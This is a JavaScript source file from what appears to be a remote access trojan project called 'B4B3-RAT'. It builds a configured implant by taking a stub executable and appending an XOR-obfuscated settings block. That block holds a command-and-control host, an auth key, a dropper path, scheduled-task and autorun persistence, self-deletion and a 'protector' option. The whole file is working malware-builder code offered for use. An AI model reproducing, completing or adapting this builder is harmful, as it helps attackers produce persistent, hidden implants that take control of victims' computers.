"use strict";

const fs   = require("fs");
const path = require("path");
const { STUB_STRUCT, STUB_SETTINGS_SIZE, STUB_MAGIC } = require("../config/constants");

function stubDeriveXorKey(stubBuf) {
  const key = Buffer.alloc(8, 0);
  const n   = Math.min(stubBuf.length, 1024);
  for (let i = 0; i < n; i++) {
    let b = key[i % 8] ^ stubBuf[i];
    b = ((b << 3) | (b >> 5)) & 0xFF;
    key[i % 8] = b;
  }
  return key;
}

function buildStubBinary(opts) {
  const stubPath = path.join(__dirname, "..", "..", "B4B3-RAT", "Stub", "Stub.exe");
  if (!fs.existsSync(stubPath)) throw new Error("Stub.exe not found at: " + stubPath);
  const stubBuf  = fs.readFileSync(stubPath);
  const settings = Buffer.alloc(STUB_SETTINGS_SIZE, 0);

  const putStr  = (field, str) => {
    const { off, len } = STUB_STRUCT[field];
    settings.fill(0, off, off + len);
    if (str) settings.write(String(str).slice(0, len - 1), off, "binary");
  };
  const putBool = (field, val) => { settings[STUB_STRUCT[field].off] = val ? 1 : 0; };

  const hostBuf = Buffer.from(opts.c2Host || "", "binary");
  if (hostBuf.length > 126) throw new Error("c2_host too long (max 126 chars)");
  hostBuf.copy(settings, STUB_STRUCT.botapi.off);

  putStr("chatid",         opts.authKey      || "changeme");
  putStr("drop",           opts.drop         || "");
  putBool("drop_run",      !!opts.dropRun);
  putStr("scheduler_name", opts.scheduler    || "");
  putBool("scheduler_state", !!opts.scheduler);
  putStr("autorun",        opts.autorun      || "");
  putBool("autorun_state", !!opts.autorun);
  putStr("client_delay",   String(opts.delay || "5000"));
  putBool("auto_delete",   !!opts.autoDelete);
  putBool("protector",     !!opts.protector);
  putStr("protectorName",  opts.protectorName || "");

  const xorKey = stubDeriveXorKey(stubBuf);
  for (let i = 0; i < settings.length; i++) settings[i] ^= xorKey[i % 8];

  return Buffer.concat([stubBuf, STUB_MAGIC, settings]);
}

module.exports = { buildStubBinary };
